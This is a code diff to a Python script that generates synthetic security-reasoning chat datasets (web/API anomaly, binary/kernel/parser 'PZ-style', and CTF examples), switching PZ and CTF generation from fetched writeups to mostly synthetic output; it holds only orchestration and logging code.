-        print(f"Tool failure pool : {len(STANDARD_TOOL_FAILURES)}")
+        print(f"Synth (web/API anomaly)      : {count_written(args.out_synth)}/{TARGET_SYNTH}")
+        print(f"PZ    (binary/kernel/parser) : {count_written(args.out_pz)}/{TARGET_PZ}")
+        print(f"CTF   (challenge reasoning)  : {count_written(args.out_ctf)}/{TARGET_CTF}")
+        print(f"\nType A — Anomaly templates  : {len(ANOMALY_TEMPLATES)} types")
+        print(f"Type A — Synthetic targets  : {len(SYNTH_TARGETS)}")
+        print(f"Type A — Tool failure pool  : {len(STANDARD_TOOL_FAILURES)}")
+        print(f"Type B — PZ domain scenarios: {len(PZ_SCENARIOS)}")
+        print(f"Type C — CTF scenarios      : {len(CTF_CHALLENGE_SCENARIOS)}")
         return
 
     # ── TEST MODE ────────────────────────────────────────────────────────────
@@ -716,34 +1012,36 @@ def main() -> None:
                     print(f"  Example {i+1}: FAILED")
 
         if args.type in ("pz", "all"):
-            print(f"\n[B] Project Zero fetch test...")
-            writeups = fetch_pz_writeups()
-            print(f"  Fetched {len(writeups)} Project Zero PoC writeups")
-            for w in writeups[:3]:
-                print(f"    {w['name'][:50]}  ({len(w['text'])} chars)")
-            if writeups:
-                print(f"\n  Generating example from: {writeups[0]['name']}")
-                ex = generate_pz_example(writeups[0])
+            print(f"\n[B] PZ-style binary/kernel/parser examples...")
+            # Try bonus real-writeup fetch first; always show synthetic result
+            real_writeups = fetch_pz_writeups()
+            print(f"  Real writeups fetched: {len(real_writeups)}")
+            for w in real_writeups[:3]:
+                print(f"    [{w.get('repo','?')}] {w['name'][:40]}  ({len(w['text'])} chars)")
+
+            print(f"\n  Generating {args.test_n} synthetic PZ example(s) (always works)...")
+            for i in range(args.test_n):
+                ex = generate_pz_example_synth()
                 if ex:
-                    print(f"  User msg : {ex['messages'][1]['content'][:250]!r}")
-                    print(f"  Asst msg : {ex['messages'][2]['content'][:400]!r}")
+                    print(f"\n  Example {i+1}:")
+                    print(f"  Domain  : {ex.get('domain', '?')}")
+                    print(f"  User msg: {ex['messages'][1]['content'][:250]!r}")
+                    print(f"  Asst msg: {ex['messages'][2]['content'][:400]!r}")
                 else:
-                    print("  FAILED")
+                    print(f"  Example {i+1}: FAILED")
 
         if args.type in ("ctf", "all"):
-            print(f"\n[C] CTF writeups fetch test...")
-            writeups = fetch_ctf_writeups()
-            print(f"  Fetched {len(writeups)} novel CTF writeups")
-            for w in writeups[:3]:
-                print(f"    {w['name'][:50]}  (repo: {w['repo']}, {len(w['text'])} chars)")
-            if writeups:
-                print(f"\n  Generating example from: {writeups[0]['name']}")
-                ex = generate_ctf_example(writeups[0])
+            print(f"\n[C] CTF-style challenge examples...")
+            print(f"  Generating {args.test_n} synthetic CTF example(s) (always works)...")
+            for i in range(args.test_n):
+                ex = generate_ctf_example_synth()
                 if ex:
-                    print(f"  User msg : {ex['messages'][1]['content'][:250]!r}")
-                    print(f"  Asst msg : {ex['messages'][2]['content'][:400]!r}")
+                    print(f"\n  Example {i+1}:")
+                    print(f"  Category: {ex.get('category', '?')}")
+                    print(f"  User msg: {ex['messages'][1]['content'][:250]!r}")
+                    print(f"  Asst msg: {ex['messages'][2]['content'][:400]!r}")
                 else:
-                    print("  FAILED")
+                    print(f"  Example {i+1}: FAILED")
 
         print("\n" + "=" * 70)
         print("TEST COMPLETE — run without --test to generate full dataset")
@@ -770,64 +1068,40 @@ def main() -> None:
     if args.type in ("pz", "all"):
         existing = count_written(args.out_pz)
         needed   = TARGET_PZ - existing
-        print(f"\n[B] Project Zero: {existing}/{TARGET_PZ}")
-        writeups = fetch_pz_writeups()
-        print(f"  Fetched {len(writeups)} PZ writeups")
+        print(f"\n[B] PZ-style: {existing}/{TARGET_PZ} (synthetic primary)")
 
-        if writeups:
-            pool = writeups * (needed // max(len(writeups), 1) + 1)
+        # Seed cache with any real writeups available (bonus variety)
+        real_writeups = fetch_pz_writeups()
+        if real_writeups:
+            print(f"  Seeding with {len(real_writeups)} real writeups as bonus variety")
 
-            def _pz_worker(w: dict) -> int:
-                ex = generate_pz_example(w)
-                return append_jsonl(args.out_pz, [ex] if ex else [])
+        # Always generate synthetically — real writeups used only if in cache
+        def _pz_worker(_: int) -> int:
+            # 30% chance to use a real writeup if available, 70% pure synthetic
+            if real_writeups and random.random() < 0.3:
+                ex = generate_pz_example(random.choice(real_writeups))
+            else:
+                ex = generate_pz_example_synth()
+            return append_jsonl(args.out_pz, [ex] if ex else [])
 
-            with ThreadPoolExecutor(max_workers=args.workers) as ex:
-                futs = {ex.submit(_pz_worker, w): w for w in pool[:needed]}
-                for fut in tqdm(as_completed(futs), total=len(futs), desc="pz"):
-                    total_written += fut.result()
-        else:
-            print("  PZ fetch failed — supplementing with synth examples")
-            def _pz_synth_worker(_: int) -> int:
-                ex = generate_synth_chain()
-                if ex:
-                    ex["type"] = "pz_synth"
-                return append_jsonl(args.out_pz, [ex] if ex else [])
-
-            with ThreadPoolExecutor(max_workers=args.workers) as ex:
-                futs = {ex.submit(_pz_synth_worker, i): i for i in range(needed)}
-                for fut in tqdm(as_completed(futs), total=len(futs), desc="pz-synth"):
-                    total_written += fut.result()
+        with ThreadPoolExecutor(max_workers=args.workers) as ex:
+            futs = {ex.submit(_pz_worker, i): i for i in range(needed)}
+            for fut in tqdm(as_completed(futs), total=len(futs), desc="pz"):
+                total_written += fut.result()
 
     if args.type in ("ctf", "all"):
         existing = count_written(args.out_ctf)
         needed   = TARGET_CTF - existing
-        print(f"\n[C] CTF writeups: {existing}/{TARGET_CTF}")
-        writeups = fetch_ctf_writeups()
-        print(f"  Fetched {len(writeups)} novel CTF writeups")
+        print(f"\n[C] CTF-style: {existing}/{TARGET_CTF} (synthetic primary)")
 
-        if writeups:
-            pool = writeups * (needed // max(len(writeups), 1) + 1)
+        def _ctf_worker(_: int) -> int:
+            ex = generate_ctf_example_synth()
+            return append_jsonl(args.out_ctf, [ex] if ex else [])
 
-            def _ctf_worker(w: dict) -> int:
-                ex = generate_ctf_example(w)
-                return append_jsonl(args.out_ctf, [ex] if ex else [])
-
-            with ThreadPoolExecutor(max_workers=args.workers) as ex:
-                futs = {ex.submit(_ctf_worker, w): w for w in pool[:needed]}
-                for fut in tqdm(as_completed(futs), total=len(futs), desc="ctf"):
-                    total_written += fut.result()
-        else:
-            print("  CTF fetch failed — supplementing with synth examples")
-            def _ctf_synth_worker(_: int) -> int:
-                ex = generate_synth_chain()
-                if ex:
-                    ex["type"] = "ctf_synth"
-                return append_jsonl(args.out_ctf, [ex] if ex else [])
-
-            with ThreadPoolExecutor(max_workers=args.workers) as ex:
-                futs = {ex.submit(_ctf_synth_worker, i): i for i in range(needed)}
-                for fut in tqdm(as_completed(futs), total=len(futs), desc="ctf-synth"):
-                    total_written += fut.result()
+        with ThreadPoolExecutor(max_workers=args.workers) as ex:
+            futs = {ex.submit(_ctf_worker, i): i for i in range(needed)}
+            for fut in tqdm(as_completed(futs), total=len(futs), desc="ctf"):
+                total_written += fut.result()
 
     print(f"\nWrote {total_written} new examples total")
     print(f"  Synth : {args.out_synth}")
